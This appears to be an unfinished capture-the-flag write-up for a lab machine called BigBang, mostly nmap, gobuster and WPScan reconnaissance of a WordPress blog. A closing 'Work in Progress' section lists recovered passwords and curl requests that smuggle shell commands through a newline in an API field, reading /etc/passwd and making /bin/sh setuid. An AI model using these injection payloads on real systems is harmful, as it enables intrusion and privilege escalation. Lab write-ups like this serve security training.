![image](https://github.com/user-attachments/assets/bd97eac3-edbc-4a0e-a477-5600d0848b2d)

## 1. Recon

### 1.1. Port Scan `nmap`

Quick initial scan to find open ports:

```console
root@kali:~# nmap -sS -p- --min-rate 100000 -Pn 10.10.11.52
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-26 07:12 +08
Warning: 10.10.11.52 giving up on port because retransmission cap hit (10).
Nmap scan report for bigbang.htb (10.10.11.52)
Host is up (0.0065s latency).
Not shown: 64563 closed tcp ports (reset), 970 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.73 seconds
```

Script and version scan on open ports:

```console
root@kali:~# nmap -Pn -p 22,80 -sCV 10.10.11.52
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-26 07:14 +08
Nmap scan report for bigbang.htb (10.10.11.52)
Host is up (0.0049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 d4:15:77:1e:82:2b:2f:f1:cc:96:c6:28:c1:86:6b:3f (ECDSA)
|_  256 6c:42:60:7b:ba:ba:67:24:0f:0c:ac:5d:be:92:0c:66 (ED25519)
80/tcp open  http    Apache httpd 2.4.62
|_http-title: Did not follow redirect to http://blog.bigbang.htb/
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: Host: blog.bigbang.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.67 seconds
```

## 2. Web enumeration

### 2.1. Enumerate directories

`gobuster` discovers that the site is a WordPress blog

```console
root@kali:~# gobuster dir -u http://blog.bigbang.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://blog.bigbang.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 281]
/.htaccess            (Status: 403) [Size: 281]
/.hta                 (Status: 403) [Size: 281]
/index.php            (Status: 301) [Size: 0] [--> http://blog.bigbang.htb/]
/server-status        (Status: 403) [Size: 281]
/wp-admin             (Status: 301) [Size: 323] [--> http://blog.bigbang.htb/wp-admin/]
/wp-content           (Status: 301) [Size: 325] [--> http://blog.bigbang.htb/wp-content/]
/wp-includes          (Status: 301) [Size: 326] [--> http://blog.bigbang.htb/wp-includes/]
Progress: 4744 / 4745 (99.98%)
/xmlrpc.php           (Status: 405) [Size: 42]
===============================================================
Finished
===============================================================
```

> [!Tip]
>
> The site is configured to redirect requests to http://blog.bigbang.htb
>
> Attempting to use gobuster against the IP address http://10.10.11.52 or hostname http://bigbang.htb would result in the below error:
>
> ```
> Error: the server returns a status code that matches the provided options for non existing urls. http://bigbang.htb/776eaa9f-db72-4e35-a68c-7b72fe34da2c => 301 (Length: 345). To continue please exclude the status code or the length
> ```

### 2.2. Enumerate WordPress

Use `WPScan` with below options:

|Switch|Action|
|---|---|
|`u`|User IDs range. e.g: u1-5<br>Range separator to use: '-'<br>Value if no argument supplied: 1-10|
|`ap`|All plugins|

WPScan default switches: All Plugins (`ap`), Config Backups (`cb`)

```console
root@kali:~# wpscan --url http://blog.bigbang.htb --enumerate u,ap
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blog.bigbang.htb/ [10.10.11.52]
[+] Started: Sat Apr 26 14:28:37 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.62 (Debian)
 |  - X-Powered-By: PHP/8.3.2
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.bigbang.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.bigbang.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.bigbang.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.bigbang.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.4 identified (Insecure, released on 2024-06-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.bigbang.htb/?feed=rss2, <generator>https://wordpress.org/?v=6.5.4</generator>
 |  - http://blog.bigbang.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=6.5.4</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | [!] Directory listing is enabled
 | Style URL: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] buddyforms
 | Location: http://blog.bigbang.htb/wp-content/plugins/buddyforms/
 | Last Updated: 2025-02-27T23:01:00.000Z
 | [!] The version is out of date, the latest version is 2.8.17
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 2.7.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blog.bigbang.htb/wp-content/plugins/buddyforms/readme.txt

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] root
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] shawking
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Apr 26 14:28:40 2025
[+] Requests Done: 14
[+] Cached Requests: 48
[+] Data Sent: 3.815 KB
[+] Data Received: 17.257 KB
[+] Memory used: 271.41 MB
[+] Elapsed time: 00:00:03
```

## X. Work in Progress

`shawking`: `quantumphysics`

`developer`: `bigbang`


```
curl http://localhost:9090/login -H 'Content-Type: application/json' -d '{"username": "developer", "password": "bigbang"}'
```

```
curl http://localhost:9090/command -d '{"command":"send_image","output_file":"\n /etc/passwd"}' -H 'Content-Type: application/json' \
-H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0NTYzMDM3MCwianRpIjoiZmI1ZDkzYjItMWRmNS00NDgyLWI4MWUtYjAzNGVmZTdkZjUwIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTc0NTYzMDM3MCwiY3NyZiI6Ijg4NWM5NGE3LTRkYjQtNGFjYS1iZjIzLTFjMWRkOTcwMWJiYiIsImV4cCI6MTc0NTYzMzk3MH0.FvDIB3zps3OMOONPdlCrjTCSc5qdV7F8J_MUrCFK-Pg'
```

```
curl http://localhost:9090/command -d '{"command":"send_image","output_file":"\nchmod 4777 /bin/sh"}' -H 'Content-Type: application/json' \
-H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0NTYzMDM3MCwianRpIjoiZmI1ZDkzYjItMWRmNS00NDgyLWI4MWUtYjAzNGVmZTdkZjUwIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTc0NTYzMDM3MCwiY3NyZiI6Ijg4NWM5NGE3LTRkYjQtNGFjYS1iZjIzLTFjMWRkOTcwMWJiYiIsImV4cCI6MTc0NTYzMzk3MH0.FvDIB3zps3OMOONPdlCrjTCSc5qdV7F8J_MUrCFK-Pg'
```
